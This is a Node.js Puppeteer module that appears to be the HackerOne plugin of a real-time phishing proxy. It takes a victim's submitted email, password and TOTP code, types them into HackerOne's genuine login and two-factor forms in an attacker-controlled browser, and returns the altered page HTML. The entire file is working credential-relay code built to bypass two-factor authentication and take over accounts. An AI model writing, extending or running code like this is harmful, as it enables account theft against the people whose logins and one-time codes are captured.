const { Application } = require("../Application")
const { getHeaders } = require("../headers")
const fs = require("fs")
class Hackerone extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]

        try {
            if (spikeType == "login") {
                let email = `#sign_in_email`
                let password = `#sign_in_password`
                await page.waitForSelector(email)
                await page.waitForSelector(password)

                await page.type(email, body["user[email]"])
                await page.type(password, body["user[password]"])

                await Promise.all([
                    page.click(`[type="submit"]`),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "otp_code") {
                let otpInput = "#sign_in_totp_code"

                await page.waitForSelector(otpInput)
                await page.type(otpInput, body["user[totp_code]"])
                await Promise.all([
                    page.click(`[type="submit"]`),
                    new Promise(re => setTimeout(re, 6000))
                ])
            } else {
                return await this.openTAB(true, 4000)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true, 4000)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Hackerone(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true, 4000)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}